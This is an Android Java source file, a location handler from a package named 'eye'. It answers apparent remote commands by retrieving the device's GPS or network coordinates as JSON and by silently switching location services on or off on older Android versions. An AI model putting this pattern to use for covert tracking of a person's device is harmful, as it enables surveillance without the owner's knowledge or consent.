package com.idsiber.eye.handlers;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import androidx.core.app.ActivityCompat;

import com.idsiber.eye.CommandResult;

import org.json.JSONObject;

/**
 * Handler untuk layanan lokasi
 */
public class LocationHandler implements LocationListener {
    private static final String TAG = "LocationHandler";
    private Context context;
    private LocationManager locationManager;
    private Location lastKnownLocation;

    public LocationHandler(Context context) {
        this.context = context;
        this.locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
    }

    public CommandResult getLocation() {
        try {
            if (locationManager == null) {
                return new CommandResult(false, "LocationManager not available", null);
            }

            if (!isLocationEnabled()) {
                return new CommandResult(false, "Location services are disabled", null);
            }

            // Check permissions
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                return new CommandResult(false, "Location permission not granted", null);
            }

            // Get last known location first
            Location gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            Location networkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

            Location bestLocation = getBestLocation(gpsLocation, networkLocation);
            
            if (bestLocation != null) {
                JSONObject locationInfo = createLocationJSON(bestLocation);
                return new CommandResult(true, "Location retrieved", locationInfo.toString());
            }

            // If no cached location, request fresh location
            requestLocationUpdate();
            
            // Wait a bit for location update
            try {
                Thread.sleep(5000); // Wait 5 seconds
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }

            if (lastKnownLocation != null) {
                JSONObject locationInfo = createLocationJSON(lastKnownLocation);
                return new CommandResult(true, "Location retrieved after update", locationInfo.toString());
            }

            return new CommandResult(false, "Unable to retrieve location", null);
        } catch (Exception e) {
            return new CommandResult(false, "Failed to get location: " + e.getMessage(), null);
        }
    }

    public CommandResult enableLocation() {
        try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                return new CommandResult(false, "Location services must be enabled by user on Android 9+", null);
            }

            // For older versions, try to enable location
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
                int mode = Settings.Secure.getInt(context.getContentResolver(), Settings.Secure.LOCATION_MODE);
                if (mode == Settings.Secure.LOCATION_MODE_OFF) {
                    Settings.Secure.putInt(context.getContentResolver(), 
                        Settings.Secure.LOCATION_MODE, Settings.Secure.LOCATION_MODE_HIGH_ACCURACY);
                    return new CommandResult(true, "Location services enabled", null);
                } else {
                    return new CommandResult(true, "Location services already enabled", null);
                }
            } else {
                return new CommandResult(false, "Location control not supported on this Android version", null);
            }
        } catch (Exception e) {
            return new CommandResult(false, "Failed to enable location: " + e.getMessage(), null);
        }
    }

    public CommandResult disableLocation() {
        try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                return new CommandResult(false, "Location services must be disabled by user on Android 9+", null);
            }

            // For older versions, try to disable location
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
                Settings.Secure.putInt(context.getContentResolver(), 
                    Settings.Secure.LOCATION_MODE, Settings.Secure.LOCATION_MODE_OFF);
                return new CommandResult(true, "Location services disabled", null);
            } else {
                return new CommandResult(false, "Location control not supported on this Android version", null);
            }
        } catch (Exception e) {
            return new CommandResult(false, "Failed to disable location: " + e.getMessage(), null);
        }
    }

    private boolean isLocationEnabled() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
            return locationManager.isLocationEnabled();
        } else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
            int locationMode = Settings.Secure.getInt(context.getContentResolver(), 
                Settings.Secure.LOCATION_MODE, Settings.Secure.LOCATION_MODE_OFF);
            return locationMode != Settings.Secure.LOCATION_MODE_OFF;
        } else {
            String locationProviders = Settings.Secure.getString(context.getContentResolver(), 
                Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
            return locationProviders != null && !locationProviders.isEmpty();
        }
    }

    private Location getBestLocation(Location gpsLocation, Location networkLocation) {
        if (gpsLocation == null && networkLocation == null) {
            return null;
        }
        
        if (gpsLocation == null) {
            return networkLocation;
        }
        
        if (networkLocation == null) {
            return gpsLocation;
        }

        // If both locations are available, return the more recent one
        long gpsTime = gpsLocation.getTime();
        long networkTime = networkLocation.getTime();
        
        // If GPS location is more recent or same time, prefer GPS for accuracy
        if (gpsTime >= networkTime) {
            return gpsLocation;
        } else {
            // If network location is significantly more recent (>2 minutes), prefer it
            if (networkTime - gpsTime > 2 * 60 * 1000) {
                return networkLocation;
            } else {
                return gpsLocation; // Prefer GPS for accuracy
            }
        }
    }

    private void requestLocationUpdate() {
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                
                // Request location updates from both providers
                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, this, null);
                }
                
                if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    locationManager.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, this, null);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error requesting location update", e);
        }
    }

    private JSONObject createLocationJSON(Location location) throws Exception {
        JSONObject locationInfo = new JSONObject();
        locationInfo.put("latitude", location.getLatitude());
        locationInfo.put("longitude", location.getLongitude());
        locationInfo.put("accuracy", location.getAccuracy());
        locationInfo.put("altitude", location.getAltitude());
        locationInfo.put("speed", location.getSpeed());
        locationInfo.put("bearing", location.getBearing());
        locationInfo.put("provider", location.getProvider());
        locationInfo.put("timestamp", location.getTime());
        locationInfo.put("timestamp_readable", new java.util.Date(location.getTime()).toString());
        
        return locationInfo;
    }

    // LocationListener interface methods
    @Override
    public void onLocationChanged(Location location) {
        lastKnownLocation = location;
        Log.d(TAG, "Location updated: " + location.getLatitude() + ", " + location.getLongitude());
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {
        Log.d(TAG, "Location provider status changed: " + provider + " status: " + status);
    }

    @Override
    public void onProviderEnabled(String provider) {
        Log.d(TAG, "Location provider enabled: " + provider);
    }

    @Override
    public void onProviderDisabled(String provider) {
        Log.d(TAG, "Location provider disabled: " + provider);
    }

    public void cleanup() {
        try {
            if (locationManager != null) {
                locationManager.removeUpdates(this);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error cleaning up location handler", e);
        }
    }
}
